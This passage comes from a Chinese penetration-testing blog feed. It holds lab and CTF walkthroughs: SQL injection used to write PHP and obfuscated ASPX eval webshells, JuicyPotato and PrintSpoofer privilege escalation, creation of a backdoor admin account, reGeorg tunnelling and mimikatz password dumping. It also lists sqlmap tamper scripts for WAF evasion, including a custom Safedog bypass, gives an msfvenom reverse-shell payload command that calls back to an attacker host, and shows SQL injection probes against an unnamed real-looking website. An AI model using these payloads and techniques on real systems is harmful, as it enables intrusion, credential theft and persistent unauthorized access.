class="literal">False</span>)</span><br><span class="line">    <span class="comment"># print(req.status_code)</span></span><br><span class="line"></span><br><span class="line">    url2 = url + <span class="string">&#x27;/aaa.txt&#x27;</span></span><br><span class="line">    <span class="comment"># print(url2)</span></span><br><span class="line">    req2 = requests.get(url=url2, headers=header, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;root:x:0:0:root:/root:/bin/bash&#x27;</span> <span class="keyword">in</span> req2.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] url:&quot;</span> + url + <span class="string">&quot;--------------存在漏洞[*]&quot;</span>)</span><br><span class="line">        output = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&quot;a+&quot;</span>)  </span><br><span class="line">        output.write(url + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        output.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] url:&quot;</span> + url + <span class="string">&quot;-------------不存在漏洞[*]&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, dest=<span class="string">&quot;url&quot;</span>, default = <span class="string">&#x27;&#x27;</span> , <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;输入url&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--file&quot;</span>, dest=<span class="string">&quot;file&quot;</span>, default= <span class="string">&#x27;&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;收集的txt&#x27;</span>)</span><br><span class="line">    (option, args) = parser.parse_args()</span><br><span class="line">    <span class="comment"># print(parser.parse_args())</span></span><br><span class="line">    url = option.url</span><br><span class="line">    file = option.file</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Start .......              [*]&quot;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">                url = line.strip()</span><br><span class="line">                url = parse_url(url)</span><br><span class="line"></span><br><span class="line">                t = threading.Thread(target=exp, args=(url,))</span><br><span class="line">                thread.append(t)</span><br><span class="line">        <span class="built_in">print</span>(thread)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> thread:</span><br><span class="line">            t.start()</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> thread:</span><br><span class="line">            t.join()</span><br><span class="line">                <span class="comment"># exp(url)</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] End .......                [*]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> url !=<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        exp(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner()</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>POC</tag>
      </tags>
  </entry>
  <entry>
    <title>zkaq内网靶场2</title>
    <url>/posts/ae9fec7e/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>zkaq内网靶场1</title>
    <url>/posts/3796bdc4/</url>
    <content><![CDATA[<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>输入 <code>?id=1&#39;</code> 网站报错 爆出网站的绝对路径</p>
<p><img src="/posts/3796bdc4/dir.png"></p>
<p>?id=1 order by 2 发现存在两个字段</p>
<p>使用union select没有回显，使用 into outfile 进行文件写入</p>
<p><code>?id = 1 and 1=2 union select 1,2 into outfile &#39;C:/phpStudy/WWW/m.txt&#39;</code></p>
<p>访问  m.txt 成功写入</p>
<p><img src="/posts/3796bdc4/m.png"></p>
<p>尝试写入一句话到网站根目录中</p>
<p><code>?id=1 union select 1,&#39;&lt;?php eval($_REQUEST[8])?&gt;&#39; into outfile &#39;C:/phpStudy/WWW/zzz.php&#39;</code></p>
<p>访问mm.php发现成功写入，使用蚁剑进行连接</p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>进入终端查看当前权限 <code>whoami</code> 发现权限为 test权限</p>
<p><code>ipconfig </code>发现内网ip 为 10.0.1.4</p>
<p><code>netstat -ano</code> 查看开放的端口</p>
<p><code>tasklist</code> 查看运行的进程</p>
<p><code>systeminfo</code>  查看系统信息 补丁号 </p>
<p><img src="/posts/3796bdc4/buding.png"></p>
<p><a href="http://bugs.hacking8.com/tiquan/">http://bugs.hacking8.com/tiquan/</a> </p>
<p>去这个网站找一下可以利用的exp</p>
<br>

<h4 id="JuicyPotato提权"><a href="#JuicyPotato提权" class="headerlink" title="JuicyPotato提权"></a>JuicyPotato提权</h4><p>HotPotato提权</p>
<p>上传 JuicyPotato.exe </p>
<p><code>bbb.exe -p &quot;whoami&quot;</code></p>
<p><img src="/posts/3796bdc4/potato.png"></p>
<p>提权为system权限，然后再添加用户</p>
<p><code>net user Mamor A1S2D3! /add</code> </p>
<p> bbb.exe -p “net localgroup administrators Mamor /add”  //将用户添加到管理员组权限</p>
<p><img src="/posts/3796bdc4/netuser1.png"></p>
<p>net user 查看是否创建成功</p>
<p><img src="/posts/3796bdc4/netuser2.png"></p>
<p>成功创建用户</p>
<br>

<h4 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h4><p>内网穿透两种方法:<br>1.让目标机器去连接外网主机(需要公网ip)  前提是目标可以访问外网<br>2.在目标机器上设置信号站(放一个web文件带目标服务器，所有的流量都要通过这个文件)</p>
<p>使用reGeorg进行内网穿透 </p>
<p>将 reGeorg中的 tunnel.nosocket.php 传到目标机器 改名为reG.php</p>
<p>再公网访问下 </p>
<p><img src="/posts/3796bdc4/reG1.png"></p>
<p>本机执行 (python2)</p>
<p><code>python reGeorgSocksProxy.py -l 127.0.0.1 -p 9999 -u http://afsgr16-b1ferw.aqlab.cn/reG.php</code></p>
<p><img src="/posts/3796bdc4/reGrun.png"></p>
<p>本机使用Proxifier 设置代理服务器 127.0.0.1 9999 socks5</p>
<p><img src="/posts/3796bdc4/Proxy.png"></p>
<p>设置代理规则 </p>
<p><img src="/posts/3796bdc4/Proxy2.png"></p>
<p>设置完代理后 使用 mstsc 远程连接10.0.1.4 成功登录</p>
<br>

<h4 id="使用-mimikatz-读取密码"><a href="#使用-mimikatz-读取密码" class="headerlink" title="使用 mimikatz 读取密码"></a>使用 mimikatz 读取密码</h4><p>将 mimikatz通过蚁剑上传到服务器 以管理员身份运行（windows2012/2016不能抓）</p>
<p>提权<code> privilege::debug</code></p>
<p><img src="/posts/3796bdc4/mm2.png"></p>
<p>抓取密码 <code>sekurlsa::logonpasswords</code></p>
<p>成功抓取到Administrator密码 woshifengge1.</p>
<p><img src="/posts/3796bdc4/mm3.png"></p>
<br>

<h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>探测内网中是否还有其它主机</p>
<p>mstsc 尝试连接10.0.1.8 使用admin 密码成功登录</p>
<p>得到flag</p>
<p><img src="/posts/3796bdc4/flag.png"></p>
]]></content>
      <categories>
        <category>zkaq</category>
      </categories>
      <tags>
        <tag>zkaq</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap_tamper</title>
    <url>/posts/f47a5413/</url>
    <content><![CDATA[<h3 id="几个常用的tamper"><a href="#几个常用的tamper" class="headerlink" title="几个常用的tamper"></a>几个常用的tamper</h3><h4 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h4><pre><code>适用数据库: All

作用: 进行base64编码

使用前: ` tamper(&quot;1&#39; AND SLEEP(5)#&quot;)`

使用后: `&#39;MScgQU5EIFNMRUVQKDUpIw==&#39;`
</code></pre>
<br>

<h4 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a>space2plus.py</h4><pre><code>适用数据库: All

作用: 把空格替换为  `+`

使用前:  `tamper(&#39;SELECT id FROM users&#39;)`

使用后: `&#39;SELECT+id+FROM+users&#39;`
</code></pre>
<h4 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a>space2comment.py</h4><pre><code>测试通过数据库： Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0

作用: 把空格替换为` /**/`

使用前: `tamper(&#39;SELECT id FROM users&#39;)`

使用后: `&#39;SELECT/**/id/**/FROM/**/users&#39;`
</code></pre>
<h4 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a>space2randomblank.py</h4><pre><code>作用:  把空格换为其他有效字符

使用前:  `tamper(&#39;SELECT id FROM users&#39;)`

使用后:  `&#39;SELECT%0Did%0CFROM%0Ausers&#39;`
</code></pre>
<h4 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py"></a>space2mysqlblank.py</h4><pre><code>适用数据库：MySQL

测试通过数据库：MySQL 5.1

作用：将空格替换为其他空格符号(’%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)

使用前：`tamper(&#39;SELECT id FROM users&#39;)`

使用后：`&#39;SELECT%A0id%0CFROM%0Dusers&#39;`
</code></pre>
<h4 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a>space2dash.py</h4><pre><code>适用数据库：All

作用：将空格替换为--，并添加一个随机字符串和换行符

使用前：`tamper(&#39;1 AND 9227=9227&#39;)`

使用后：`1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227`
</code></pre>
<br>

<h4 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a>randomcomments.py</h4><pre><code>适用数据库:  All

作用: 使用注释符分割 SQL关键字

使用前:  `tamper(&#39;INSERT&#39;)`

使用后:  `I/**/NS/**/ERT`
</code></pre>
<h4 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a>randomcase.py</h4><pre><code>作用: 将payload随机大小写

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0

使用前: `tamper(&#39;SELECT id FROM `user`&#39;)`

使用后:  `&#39;SeLeCt id FrOm `user`&#39;`
</code></pre>
<h4 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a>charencode.py</h4><pre><code>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0

作用: 对payload进行url编码

使用前: `tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)`

使用后: `&#39;%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45&#39;`
</code></pre>
<h4 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a>chardoubleencode.py</h4><pre><code>适用数据库:  All

作用:  对payload进行二次url编码

使用前: `tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)`

使用后: `&#39;%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545&#39;`
</code></pre>
<h4 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a>unmagicquotes.py</h4><pre><code>适用数据库：All

作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格

使用前：`tamper(&quot;1&#39; AND 1=1&quot;)`

使用后：`1%bf%27 AND 1=1--`
</code></pre>
<br>

<h4 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a>nonrecursivereplacement.py</h4><pre><code>适用数据库：All

作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）

使用前：`tamper(&#39;1 UNION SELECT 2--&#39;)`

使用后：`1 UNIOUNIONN SELESELECTCT 2--`
</code></pre>
<br>

<h4 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a>securesphere.py</h4><pre><code>适用数据库：All

作用：追加特定的字符串

使用脚本前：`tamper(&#39;1 AND 1=1&#39;)`

使用脚本后：`1 AND 1=1 and &#39;0having&#39;=&#39;0having&#39;`
</code></pre>
<br>

<h4 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a>modsecurityversioned.py</h4><pre><code>适用数据库：MySQL

测试通过数据库：MySQL 5.0

作用：过滤空格，使用mysql内联注释的方式进行注入

使用前：`tamper(&#39;1 AND 2&gt;1--&#39;)`

使用后：`1 /*!30874AND 2&gt;1*/--`
</code></pre>
<br>

<h4 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h4><pre><code>作用： 把等号替换为LIKE

使用前： `tamper(&#39;SELECT * FROM users WHERE id=1&#39;)`

使用后：`&#39;SELECT * FROM users WHERE id LIKE 1&#39;`
</code></pre>
<br>

<br>

<h3 id="sqlmap-tamper编写"><a href="#sqlmap-tamper编写" class="headerlink" title="sqlmap tamper编写"></a>sqlmap tamper编写</h3><p>先看一个最简单的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Slash escape single and double quotes (e.g. &#x27; -&gt; \&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;1&quot; AND SLEEP(5)#&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;1\\\\&quot; AND SLEEP(5)#&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>共由三部分组成，priority变量定义和dependencies、tamper函数定义。</p>
<p>priority 定义脚本的优先级，可用于多个tamper脚本的情况下</p>
<p>dependencies函数声明脚本的适用范围和不适用范围，可以为空值</p>
<p>tamper函数为主要函数，接受参数为payload 和**kwargs，这个脚本的返回值为替换后的payload，在这里引号被替换成了 <code>\\&#39;</code></p>
<br>

<p>下面这个是利用内联注释和注释混淆绕安全狗的tamper，具体的可以根据情况稍作修改，进行替换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;=&quot;</span>,<span class="string">&quot;/*!*/=/*!*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;ORDER&quot;</span>,<span class="string">&quot;/*!ORDER/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;AND&quot;</span>,<span class="string">&quot;/*!AND/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;FROM&quot;</span>,<span class="string">&quot;/*!FROM/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;OR&quot;</span>,<span class="string">&quot;/*!OR/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;UNION&quot;</span>,<span class="string">&quot;/*!UNION/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;SELECT&quot;</span>,<span class="string">&quot;/*!SELECT/*!/*/**/*/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;USER()&quot;</span>,<span class="string">&quot;/*!USER/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;DATABASE()&quot;</span>,<span class="string">&quot;/*!DATABASE/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;VERSION()&quot;</span>,<span class="string">&quot;/*!VERSION/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;SESSION_USER()&quot;</span>,<span class="string">&quot;/*!SESSION_USER/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;EXTRACTVALUE&quot;</span>,<span class="string">&quot;/*!EXTRACTVALUE/*!/*/**/*/()/**/&quot;</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">&quot;UPDATEXML&quot;</span>,<span class="string">&quot;/*!UPDATEXML/*!/*/**/*/&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmapos-shell使用</title>
    <url>/posts/a92f908a/</url>
    <content><![CDATA[<h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><p>phpstudy + sqlilab 本地测试</p>
<br>

<h3 id="os-shell-条件"><a href="#os-shell-条件" class="headerlink" title="os-shell 条件"></a>os-shell 条件</h3><ol>
<li>网站必须为root权限</li>
<li>知道网站绝对路径</li>
<li>PHP关闭魔术引号(GPC)，php主动转义功能关闭</li>
<li>secure_file_priv= 值为空</li>
</ol>
<br>

<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="查看数据库权限是否为dba"><a href="#查看数据库权限是否为dba" class="headerlink" title="查看数据库权限是否为dba"></a>查看数据库权限是否为dba</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --is-dba</code></p>
<p>current user is DBA: True</p>
<p><img src="/posts/a92f908a/id_dba.png"></p>
<br>

<h4 id="寻找绝对路径"><a href="#寻找绝对路径" class="headerlink" title="寻找绝对路径"></a>寻找绝对路径</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --sql-shell</code></p>
<p><code>select @@datadir</code></p>
<p><img src="/posts/a92f908a/dir.png"></p>
<p>select @@datadir: ‘D:\phpstudy_pro\Extensions\MySQL5.7.26\data\‘</p>
<p>可以推测到 网站根目录 <code>D:\phpstudy_pro\WWW</code></p>
<h4 id="os-shell"><a href="#os-shell" class="headerlink" title="os-shell"></a>os-shell</h4><p><code>python3 sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1  --os-shell</code></p>
<p>填入绝对路径</p>
<p><img src="/posts/a92f908a/os_shell.png"></p>
<p><img src="/posts/a92f908a/shell.png"></p>
<br>

<br>

<h3 id="寻找网站绝对路径的方法"><a href="#寻找网站绝对路径的方法" class="headerlink" title="寻找网站绝对路径的方法:"></a>寻找网站绝对路径的方法:</h3><ul>
<li>通过网站报错查看绝对路径</li>
<li>根据phpinfo 探针查看信息</li>
<li>配合远程代码执行漏洞  如eval() 传入phpinfo()</li>
<li>根据配置文件获取路径 </li>
<li>通过搜索引擎获取 <code>Site:test.com warning</code> <code>Site:test.com &quot;fatal error&quot;</code></li>
</ul>
]]></content>
      <categories>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>kali网络不可达</title>
    <url>/posts/5150e44b/</url>
    <content><![CDATA[<p>出现错误 网络不可达 </p>
<p>解决方法 打开网卡配置文件 <code>sudo vim /etc/network/interfaces</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#This file describes the network interfaces available on your system</span><br><span class="line"># and how to activate them. For more information, see interfaces(5)，</span><br><span class="line"></span><br><span class="line">source /etc/network/ interfaces.d/*</span><br><span class="line"></span><br><span class="line">#The Loopback network interface</span><br><span class="line">auto lo</span><br><span class="line">iface lo inet Loopback</span><br></pre></td></tr></table></figure>

<p>在后面添加两行代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure>

<p>保存退出重启即可</p>
<br>

<br>

<p>Reference</p>
<blockquote>
<p><a href="https://developer.huaweicloud.com/hero/thread-69909-1-1.html">https://developer.huaweicloud.com/hero/thread-69909-1-1.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>暗月内网靶机WP</title>
    <url>/posts/ab4fb19a/</url>
    <content><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>web服务器  </p>
<p>192.168.0.114 （本地使用nat） </p>
<p>10.10.131(Vm18) 开启防火墙 安全狗 和windows自带杀软</p>
<p>OA系统</p>
<p>10.10.1.130（VM18）</p>
<p>10.10.10.166（VM19）开启防火墙 360全家桶</p>
<p>域控dc</p>
<p>10.10.10.165（VM19） 无防护软件</p>
<p><img src="/posts/ab4fb19a/tuopu.png"></p>
<br>

<p>3台机器密码</p>
<p>win2016-web     <code>!@#QWE123</code></p>
<p>win2016-dc        <code>!@#QWE123.</code></p>
<p>win2012 oa        <code>!@#Q123</code></p>
<br>

<p>目的 :获取域控中的flag.txt内容</p>
<br>

<p>先修改host文件 绑定ip和域名 192.168.0.144 <a href="http://www.moonlab.com/">www.moonlab.com</a></p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>nmap扫一下端口</p>
<p><code>sudo nmap -sV -p- 192.168.0.114</code> 开放了21 90 999 3389 5985 6588端口</p>
<blockquote>
<p>kali@kali2020:~$ sudo nmap -sV -p- 192.168.0.114<br>[sudo] kali 的密码：<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-06-16 10:55 CST<br>Nmap scan report for <a href="http://www.moonlab.com/">www.moonlab.com</a> (192.168.0.114)<br>Host is up (0.00040s latency).<br>Not shown: 65529 filtered ports<br>PORT     STATE SERVICE       VERSION<br>21/tcp   open  ftp           Microsoft ftpd<br>80/tcp   open  http          Microsoft IIS httpd 10.0<br>999/tcp  open  http          Microsoft IIS httpd 10.0<br>3389/tcp open  ms-wbt-server Microsoft Terminal Services<br>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>6588/tcp open  http          Microsoft IIS httpd 10.0<br>MAC Address: 00:0C:29:36:38:42 (VMware)<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 123.13 seconds</p>
</blockquote>
<p>看下robots.txt</p>
<blockquote>
<p>User-agent: *<br>Disallow: /SiteServer/<br>Disallow: /SiteFiles/<br>Disallow: /UserCenter/</p>
</blockquote>
<p>访问<code>http://www.moonlab.com/siteserver</code>看到一个管理员登陆页面，使用的是siteserver cms</p>
<p>系统版本：3.6.4 .NET 版本：2.0 数据库：SqlServer </p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>去网上查一下有没有相关漏洞。</p>
<p>发现SiteServer cms存在管理员密码找回漏洞，只需要关闭js 然后输入admin 点击下一步即可得到管理员密码</p>
<p><img src="/posts/ab4fb19a/1.png"></p>
<p><img src="/posts/ab4fb19a/2.png"></p>
<p><img src="/posts/ab4fb19a/3.png"></p>
<p>得到密码为 admin5566 成功登录到后台</p>
<h4 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h4><p>考虑直接在站点文件管理处 上传一个aspx的一句话，但是被安全狗拦截了</p>
<p>看到有.aspx的文件 直接进行编辑修改,然后尝试连接一句话，密码为 1  ，成功使用蚁剑连接</p>
<p><img src="/posts/ab4fb19a/ant4.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">var SE=Request.Form[&quot;1&quot;];</span><br><span class="line">var SMQ=&quot;unsa&quot;,FWJVPDC=&quot;fe&quot;,PZEGHR=SMQ+FWJVPDC;</span><br><span class="line">function AJHB()</span><br><span class="line">&#123;</span><br><span class="line">return SE;</span><br><span class="line">&#125;</span><br><span class="line">function NCBRJ()</span><br><span class="line">&#123;</span><br><span class="line">    eval(AJHB(),PZEGHR);</span><br><span class="line">&#125;</span><br><span class="line">NCBRJ()</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<br>

<p>也可以在模块管理处上传,在网上找了个aspx一句话免杀，密码为M</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;% var p = Request.Item[&quot;M&quot;]; var a = p.substring(0,1); var b = p.substring(1,99999); var c = &quot;un&quot; + Char ( 115 ) + Char ( 97 ) + &quot;fe&quot;; eval(a+b,c);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>通过站点文件管理 可以找到一句话上传的路径 为 根目录\SiteFiles\SiteTemplates\1\ </p>
<p><img src="/posts/ab4fb19a/4.png"></p>
<br>

<p>使用蚁剑连接</p>
<p><img src="/posts/ab4fb19a/ant1.png"></p>
<p>whoami 显示为 <code>iis apppool\moonlab</code></p>
<p>systeminfo 查看值打了两个补丁</p>
<p>tasklist /svc 查看系统进程，查看存在什么杀软，可以看到存在安全狗</p>
<p>netstat -ano 查看本机开放端口</p>
<p>net start 查看已经启动的windows服务</p>
<blockquote>
<p>   Safedog Guard Center<br>   Safedog Update Center<br>   SafeDogCloudHelper</p>
</blockquote>
<p><img src="/posts/ab4fb19a/ant3.png"></p>
<br>

<h4 id="利用PrintSpoofer-提权"><a href="#利用PrintSpoofer-提权" class="headerlink" title="利用PrintSpoofer 提权"></a>利用PrintSpoofer 提权</h4><p>将 PrintSpoofer.exe 上传到 windows/Temp 中</p>
<p>PrintSpoofer64.exe -h 查看帮助</p>
<p>![PrintSpoofer1.PNG]</p>
<p>PrintSpoofer64.exe -i -c “whoami”</p>
<p><img src="/posts/ab4fb19a/PrintSpoofer2.png"></p>
<p>成功执行 system权限</p>
<br>

<hr>
<p>后续还未完成…..</p>
<h4 id="msf生成payload"><a href="#msf生成payload" class="headerlink" title="msf生成payload"></a>msf生成payload</h4><br>

<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.128  LPORT=2333 -e x86/shikata_ga_nai  -i 20 -f csharp -o 1.txt</code></p>
]]></content>
      <categories>
        <category>moon</category>
      </categories>
      <tags>
        <tag>moon</tag>
      </tags>
  </entry>
  <entry>
    <title>phpmyadmin漏洞复现(待完成)</title>
    <url>/posts/89c61231/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>某网站sql盲注</title>
    <url>/posts/a615296a/</url>
    <content><![CDATA[<p><code>http://www.xxxxxx.com/products.php?id=113</code></p>
<p><code>http://www.xxxxxx.com/products.php?id=114-1</code>  两页面显示相同</p>
<p>尝试闭合</p>
<p><code>http://www.xxxxxx.com/products.php?id=113&#39;</code>  页面显示错误</p>
<p>使用 “ ‘ ) 等闭合外加注释也显示错误</p>
<p>测试发现不需要进行闭合</p>
<br>

<p><code>http://www.xxxxxx.com/products.php?id=113%20and%201=1</code> 页面正常</p>
<p><code>http://www.xxxxxx.com/products.php?id=113%20and%201=2</code> 页面错误</p>
<p>使用order by 测字段数</p>
<p><code>http://www.xxxxxx.com/products.php?id=113 order by 2</code> 发现无回显</p>
<p>推测是盲注</p>
